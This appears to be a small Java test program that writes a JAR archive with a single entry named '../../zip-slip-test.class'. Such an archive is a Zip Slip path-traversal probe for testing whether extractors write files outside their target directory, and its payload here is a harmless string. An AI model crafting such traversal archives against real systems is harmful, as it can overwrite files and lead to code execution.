package me.n1ar4.zipslip;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

public class Main {
    public static void main(String[] args)throws Exception {
        String jarFileName = "example.jar";
        String entryName = "../../zip-slip-test.class";
        String content = "test";

        try (FileOutputStream fos = new FileOutputStream(jarFileName);
             JarOutputStream jos = new JarOutputStream(fos)) {
            JarEntry entry = new JarEntry(entryName);
            jos.putNextEntry(entry);
            jos.write(content.getBytes());
            jos.closeEntry();
            System.out.println("JAR file created: " + jarFileName);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
